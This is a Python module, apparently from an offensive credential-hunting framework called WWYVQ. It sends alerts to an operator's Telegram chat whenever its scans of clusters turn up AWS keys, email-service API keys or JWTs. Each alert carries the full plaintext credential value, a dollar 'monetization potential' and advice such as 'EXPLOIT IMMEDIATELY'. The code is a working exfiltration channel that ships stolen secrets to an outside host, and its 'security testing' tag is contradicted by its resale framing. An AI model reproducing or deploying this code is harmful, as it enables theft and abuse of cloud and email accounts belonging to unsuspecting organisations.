#!/usr/bin/env python3
"""
📡 Professional Telegram Notification System
Enhanced professional notifications with detailed credential information
Author: wKayaa | 2025
"""

import asyncio
import aiohttp
import json
import time
from typing import Dict, List, Optional, Any
from datetime import datetime, timezone
from dataclasses import dataclass
import logging

logger = logging.getLogger(__name__)

@dataclass
class TelegramConfig:
    """Telegram configuration"""
    bot_token: str
    chat_id: str
    enabled: bool = True
    rate_limit_delay: float = 1.0  # Seconds between messages

class ProfessionalTelegramNotifier:
    """Professional Telegram notification system with enhanced formatting"""
    
    def __init__(self, config: TelegramConfig):
        self.config = config
        self.session = None
        self.hit_counter = 0
        self.session_start_time = datetime.utcnow()
        self.last_message_time = 0
        
        # Service-specific emojis and formatting
        self.service_emojis = {
            'AWS': '🟠',
            'SendGrid': '🟢',
            'Mailgun': '🔴',
            'Mailjet': '🟡',
            'Postmark': '🟣',
            'Mandrill': '🔵',
            'Brevo': '🟤',
            'SparkPost': '🟡',
            'JWT': '🔑',
            'Generic': '⚪',
            'Unknown': '⚫'
        }
        
        # Validation status emojis
        self.validation_emojis = {
            'valid': '✅',
            'invalid': '❌',
            'unknown': '❓',
            'error': '⚠️'
        }
    
    async def __aenter__(self):
        """Async context manager entry"""
        self.session = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=30)
        )
        return self
    
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        """Async context manager exit"""
        if self.session:
            await self.session.close()
    
    async def send_credential_hit_alert(self, validation_result, cluster_info: Optional[Dict] = None):
        """Send professional credential hit alert"""
        if not self.config.enabled:
            return
        
        self.hit_counter += 1
        
        # Rate limiting
        await self._rate_limit()
        
        # Determine validation status
        validation_status = 'valid' if validation_result.is_valid else 'invalid'
        if validation_result.error_message:
            validation_status = 'error'
        
        # Get service emoji
        service_emoji = self.service_emojis.get(validation_result.service, '⚫')
        validation_emoji = self.validation_emojis.get(validation_status, '❓')
        
        # Build comprehensive message
        message = f"""🚨 **WWYVQ CREDENTIAL ALERT** 🚨

{validation_emoji} **STATUS**: {validation_status.upper()}
{service_emoji} **SERVICE**: {validation_result.service}
🔑 **TYPE**: {validation_result.credential_type}
📊 **CONFIDENCE**: {validation_result.confidence_score:.1f}%
🕐 **VALIDATED**: {validation_result.validated_at[:19]}Z

**📋 CREDENTIAL DETAILS:**
├── Value: `{validation_result.value}`
├── Method: {validation_result.validation_method}
├── Permissions: {', '.join(validation_result.permissions) if validation_result.permissions else 'None detected'}
└── Quota Info: {json.dumps(validation_result.quota_info, indent=2) if validation_result.quota_info else 'N/A'}

**🎯 HIT ANALYSIS:**
├── Hit ID: #{self.hit_counter}
├── Session Time: {self._get_session_duration()}
├── Threat Level: {self._get_threat_level(validation_result)}
└── Exploitation Ready: {'YES' if validation_result.is_valid else 'NO'}
"""

        # Add cluster information if available
        if cluster_info:
            message += f"""
**🏢 CLUSTER INFORMATION:**
├── Endpoint: {cluster_info.get('endpoint', 'Unknown')}
├── Namespace: {cluster_info.get('namespace', 'Unknown')}
├── Access Level: {cluster_info.get('access_level', 'Unknown')}
└── Environment: {cluster_info.get('environment', 'Unknown')}
"""

        # Add error information if present
        if validation_result.error_message:
            message += f"""
**⚠️ VALIDATION ERROR:**
└── {validation_result.error_message}
"""

        # Add footer
        message += f"""
**🔒 SECURITY ASSESSMENT:**
├── False Positive Risk: {self._get_false_positive_risk(validation_result)}
├── Immediate Action: {self._get_recommended_action(validation_result)}
└── Monetization Potential: {self._get_monetization_potential(validation_result)}

**👨‍💻 OPERATOR INFO:**
├── Framework: WWYVQ v5.0
├── Session: {self._get_session_id()}
├── Operator: wKayaa
└── Timestamp: {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC

#WWYVQ #CredentialHunting #SecurityTesting #wKayaa"""

        await self._send_message(message)
    
    async def send_session_summary(self, total_hits: int, valid_hits: int, services_found: Dict[str, int]):
        """Send session summary with statistics"""
        if not self.config.enabled:
            return
        
        await self._rate_limit()
        
        session_duration = self._get_session_duration()
        success_rate = (valid_hits / total_hits * 100) if total_hits > 0 else 0
        
        message = f"""📊 **WWYVQ SESSION SUMMARY** 📊

**🎯 PERFORMANCE METRICS:**
├── Total Hits: {total_hits}
├── Valid Credentials: {valid_hits}
├── Success Rate: {success_rate:.1f}%
├── Session Duration: {session_duration}
└── Hits per Hour: {self._calculate_hits_per_hour(total_hits)}

**🏆 SERVICES DISCOVERED:**
"""
        
        for service, count in services_found.items():
            emoji = self.service_emojis.get(service, '⚫')
            message += f"├── {emoji} {service}: {count} credentials\n"
        
        message += f"""
**🚀 OPERATIONAL STATUS:**
├── Framework: WWYVQ v5.0 - ACTIVE
├── Validation Engine: ENHANCED
├── False Positive Filter: ACTIVE
└── Telegram Alerts: OPERATIONAL

**💰 MONETIZATION ANALYSIS:**
├── Exploitable Services: {valid_hits}
├── Estimated Value: ${valid_hits * 50} - ${valid_hits * 200}
├── Risk Level: {'HIGH' if valid_hits > 5 else 'MEDIUM' if valid_hits > 0 else 'LOW'}
└── Recommended Action: {'IMMEDIATE EXPLOITATION' if valid_hits > 0 else 'CONTINUE SCANNING'}

**👨‍💻 OPERATOR: wKayaa**
**🕐 COMPLETED: {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC**

#WWYVQ #SessionComplete #CredentialHunting #wKayaa"""

        await self._send_message(message)
    
    async def send_real_time_stats(self, current_stats: Dict[str, Any]):
        """Send real-time statistics update"""
        if not self.config.enabled:
            return
        
        await self._rate_limit()
        
        message = f"""📈 **REAL-TIME STATISTICS** 📈

**🎯 CURRENT SCAN STATUS:**
├── Clusters Scanned: {current_stats.get('clusters_scanned', 0)}
├── Endpoints Tested: {current_stats.get('endpoints_tested', 0)}
├── Credentials Found: {current_stats.get('credentials_found', 0)}
├── Validation Rate: {current_stats.get('validation_rate', 0):.1f}%
└── Scan Progress: {current_stats.get('scan_progress', 0):.1f}%

**⚡ PERFORMANCE METRICS:**
├── Scan Speed: {current_stats.get('scan_speed', 0):.1f} targets/min
├── Response Time: {current_stats.get('avg_response_time', 0):.2f}s
├── Success Rate: {current_stats.get('success_rate', 0):.1f}%
└── Error Rate: {current_stats.get('error_rate', 0):.1f}%

**🔥 ACTIVE THREATS:**
├── High-Value Targets: {current_stats.get('high_value_targets', 0)}
├── Privileged Access: {current_stats.get('privileged_access', 0)}
├── Production Systems: {current_stats.get('production_systems', 0)}
└── Critical Vulnerabilities: {current_stats.get('critical_vulns', 0)}

**⏰ UPDATED: {datetime.utcnow().strftime('%H:%M:%S')} UTC**
**🔄 NEXT UPDATE: 60 seconds**

#WWYVQ #RealTimeStats #ActiveScan #wKayaa"""

        await self._send_message(message)
    
    async def send_error_alert(self, error_type: str, error_message: str, context: Optional[Dict] = None):
        """Send error alert with context"""
        if not self.config.enabled:
            return
        
        await self._rate_limit()
        
        message = f"""⚠️ **WWYVQ ERROR ALERT** ⚠️

**🚨 ERROR TYPE:** {error_type}
**📝 MESSAGE:** {error_message}
**🕐 TIMESTAMP:** {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC

**📋 ERROR CONTEXT:**
"""
        
        if context:
            for key, value in context.items():
                message += f"├── {key}: {value}\n"
        else:
            message += "├── No additional context available\n"
        
        message += f"""
**🔧 RECOMMENDED ACTIONS:**
├── Check system logs for details
├── Verify network connectivity
├── Review target configuration
└── Contact operator if issue persists

**👨‍💻 OPERATOR: wKayaa**
**🚀 FRAMEWORK: WWYVQ v5.0**

#WWYVQ #ErrorAlert #SystemStatus #wKayaa"""

        await self._send_message(message)
    
    async def _send_message(self, message: str):
        """Send message to Telegram with retry logic"""
        if not self.session:
            logger.error("Session not initialized")
            return
        
        max_retries = 3
        retry_delay = 2.0
        
        for attempt in range(max_retries):
            try:
                url = f"https://api.telegram.org/bot{self.config.bot_token}/sendMessage"
                payload = {
                    'chat_id': self.config.chat_id,
                    'text': message,
                    'parse_mode': 'Markdown',
                    'disable_web_page_preview': True
                }
                
                async with self.session.post(url, json=payload) as response:
                    if response.status == 200:
                        logger.info(f"✅ Telegram message sent successfully")
                        return
                    else:
                        error_text = await response.text()
                        logger.error(f"❌ Telegram API error: {response.status} - {error_text}")
                        
                        if response.status == 429:  # Rate limited
                            await asyncio.sleep(retry_delay * 2)
                        
            except Exception as e:
                logger.error(f"❌ Telegram send error (attempt {attempt + 1}): {e}")
                
                if attempt < max_retries - 1:
                    await asyncio.sleep(retry_delay)
                    retry_delay *= 2
    
    async def _rate_limit(self):
        """Implement rate limiting between messages"""
        current_time = time.time()
        time_since_last = current_time - self.last_message_time
        
        if time_since_last < self.config.rate_limit_delay:
            await asyncio.sleep(self.config.rate_limit_delay - time_since_last)
        
        self.last_message_time = time.time()
    
    def _get_session_duration(self) -> str:
        """Get formatted session duration"""
        duration = datetime.utcnow() - self.session_start_time
        hours, remainder = divmod(duration.seconds, 3600)
        minutes, seconds = divmod(remainder, 60)
        return f"{hours:02d}h {minutes:02d}m {seconds:02d}s"
    
    def _get_session_id(self) -> str:
        """Get session ID"""
        return self.session_start_time.strftime('%Y%m%d_%H%M%S')
    
    def _get_threat_level(self, validation_result) -> str:
        """Determine threat level based on validation result"""
        if validation_result.is_valid:
            if validation_result.confidence_score >= 90:
                return "🔥 CRITICAL"
            elif validation_result.confidence_score >= 75:
                return "🟠 HIGH"
            else:
                return "🟡 MEDIUM"
        else:
            return "🟢 LOW"
    
    def _get_false_positive_risk(self, validation_result) -> str:
        """Assess false positive risk"""
        if validation_result.is_valid and validation_result.confidence_score >= 85:
            return "🟢 LOW"
        elif validation_result.confidence_score >= 70:
            return "🟡 MEDIUM"
        else:
            return "🔴 HIGH"
    
    def _get_recommended_action(self, validation_result) -> str:
        """Get recommended action based on validation result"""
        if validation_result.is_valid:
            if validation_result.confidence_score >= 85:
                return "🚀 EXPLOIT IMMEDIATELY"
            else:
                return "🔍 VERIFY MANUALLY"
        else:
            return "❌ DISCARD"
    
    def _get_monetization_potential(self, validation_result) -> str:
        """Assess monetization potential"""
        if validation_result.is_valid:
            service_values = {
                'AWS': '$100-500',
                'SendGrid': '$50-200',
                'Mailgun': '$30-150',
                'Mailjet': '$25-100',
                'Postmark': '$40-180'
            }
            return service_values.get(validation_result.service, '$10-50')
        else:
            return "$0"
    
    def _calculate_hits_per_hour(self, total_hits: int) -> str:
        """Calculate hits per hour"""
        duration = datetime.utcnow() - self.session_start_time
        hours = duration.total_seconds() / 3600
        if hours > 0:
            return f"{total_hits / hours:.1f}"
        return "0.0"